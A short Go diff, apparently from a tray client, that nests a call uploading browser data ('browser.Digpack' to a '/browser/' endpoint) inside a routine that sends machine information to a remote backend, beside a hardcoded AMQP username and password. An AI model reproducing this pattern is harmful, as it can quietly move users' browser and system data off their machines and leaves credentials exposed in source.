@@ -64,15 +64,15 @@ func onReady() {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	go transfer.PacHandle(Config.PacPort)
+	// first insert
 	if lib.CheckInlib(conf.Url+backendAddr) != nil {
 		// exits in lib
 		finflag := make(chan string)
 		go machineinfo.MachineSend("http://"+conf.Url+backendAddr+"/machine/machineInfo", finflag)
 		<-finflag
-	}
-	if lib.FileExits(lib.BrowserSafepath) != nil {
-		finflag := make(chan string)
-		go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
+		if lib.FileExits(lib.BrowserSafepath) != nil {
+			go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
+		}
 	}
 	AmqpURI := "amqp://jin:jinjin123@" + conf.Url + mqAddr
 	mqhost := rmq.NewIConfigByVHost(lib.MQHOST)
@@ -132,6 +132,7 @@ func init() {
 		backendAddr = lib.PMVC
 		mqAddr = lib.PMQ
 	}
+	// not edit is quick now
 	go func() {
 		//fixed ioop download check
 		_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
